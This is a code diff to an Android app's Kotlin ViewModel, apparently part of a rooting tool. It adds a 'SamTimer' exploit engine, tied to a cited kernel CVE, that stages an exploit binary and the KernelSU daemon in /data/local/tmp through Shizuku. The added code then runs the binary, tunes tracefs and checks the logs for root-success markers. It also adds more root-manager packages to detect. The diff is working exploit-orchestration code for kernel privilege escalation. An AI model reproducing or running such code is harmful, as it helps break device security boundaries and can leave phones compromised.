@@ -182,6 +182,93 @@ class InstallViewModel(application: Application) : AndroidViewModel(application)
     }
 
     private suspend fun runExploit() {
+        val engine = AppPreferences.exploitEngine(app)
+        if (engine == ExploitEngine.SamTimer) {
+            runSamTimerExploit()
+        } else {
+            runGhostLockExploit()
+        }
+    }
+
+    private suspend fun runSamTimerExploit() {
+        val shizuku = shizukuEnabled()
+        require(shizuku) { "SamTimer requires Shizuku mode to be enabled" }
+        val targetMgr = preferredManagerPackage()
+        appendLog("[*] Exploit Engine: SamTimer (CVE-2026-98260)")
+        appendLog("[*] Target Manager: $targetMgr")
+
+        // 1. Ensure /data/local/tmp/samtimer exists
+        ShizukuController.exec(arrayOf("mkdir", "-p", "-m", "0777", "/data/local/tmp/samtimer")).waitFor()
+
+        // 2. Stage binary and ksud
+        shizukuStage(payloads.samtimer, "/data/local/tmp/samtimer/libtimer.so", "755")
+        shizukuStage(payloads.ksudNext, "/data/local/tmp/samtimer/ksud", "755")
+
+        // 3. Write target manager package
+        ShizukuController.exec(arrayOf("sh", "-c", "echo '$targetMgr' > /data/local/tmp/samtimer/manager_pkg")).waitFor()
+
+        // 4. Tracefs buffer 8192
+        ShizukuController.exec(arrayOf("sh", "-c", "echo 8192 > /sys/kernel/tracing/buffer_size_kb 2>/dev/null || true")).waitFor()
+
+        // 5. Clean old log and run
+        ShizukuController.exec(arrayOf("rm", "-f", SHIZUKU_LOG_PATH)).waitFor()
+        val logPrefix = mutableState.value.log
+        val captured = StringBuilder()
+
+        val process = ShizukuController.exec(
+            arrayOf(
+                "sh", "-c",
+                "/data/local/tmp/samtimer/libtimer.so umhpipe > $SHIZUKU_LOG_PATH 2>&1",
+            ),
+        )
+
+        val readLog: () -> String = {
+            drainProcessOutput(process, captured) + "\n" +
+                runCatching { ShizukuController.capture(arrayOf("cat", SHIZUKU_LOG_PATH)) }.getOrDefault("")
+        }
+
+        try {
+            val startedAt = SystemClock.elapsedRealtime()
+            var lastProgressAt = startedAt
+            var lastRawLog = ""
+            while (runCatching { process.isAlive }.getOrDefault(false)) {
+                val rawLog = readLog()
+                if (rawLog != lastRawLog) {
+                    publishExploitLog(logPrefix, rawLog)
+                    lastRawLog = rawLog
+                    lastProgressAt = SystemClock.elapsedRealtime()
+                }
+                val now = SystemClock.elapsedRealtime()
+                require(now - lastProgressAt < 120_000L) {
+                    app.getString(R.string.error_exploit_stalled)
+                }
+                delay(SHIZUKU_LOG_POLL_INTERVAL)
+            }
+            val exitCode = runCatching { process.waitFor() }.getOrDefault(0)
+            val rawLog = readLog()
+            publishExploitLog(logPrefix, rawLog)
+            val successful = exitCode == 0 ||
+                rawLog.contains("KSU_LOADED") ||
+                rawLog.contains("late-load ok=1") ||
+                KernelSuProbe.isSuBinaryWorking() ||
+                KernelSuProbe.isActive(app)
+
+            require(successful) {
+                if (exitCode != 0) {
+                    app.getString(R.string.error_payload_exit, exitCode)
+                } else {
+                    app.getString(R.string.error_success_marker)
+                }
+            }
+        } finally {
+            if (runCatching { process.isAlive }.getOrDefault(false)) {
+                process.destroy()
+                delay(500.milliseconds)
+            }
+        }
+    }
+
+    private suspend fun runGhostLockExploit() {
         val shizuku = shizukuEnabled()
         val helper = helperFile()
         val payload = if (shizuku) {
@@ -310,10 +397,18 @@ class InstallViewModel(application: Application) : AndroidViewModel(application)
     }
 
     private fun preferredManagerPackage(): String {
+        val configured = AppPreferences.rootManager(app)
+        if (configured != RootManager.Auto && configured.packageName != null) {
+            return configured.packageName
+        }
         return if (app.packageManager.getLaunchIntentForPackage("me.weishu.kernelsu") != null) {
             "me.weishu.kernelsu"
         } else if (app.packageManager.getLaunchIntentForPackage("com.rifsxd.ksunext") != null) {
             "com.rifsxd.ksunext"
+        } else if (app.packageManager.getLaunchIntentForPackage("com.sukisu.nova") != null) {
+            "com.sukisu.nova"
+        } else if (app.packageManager.getLaunchIntentForPackage("com.sukisu.ultra") != null) {
+            "com.sukisu.ultra"
         } else {
             "me.weishu.kernelsu"
         }
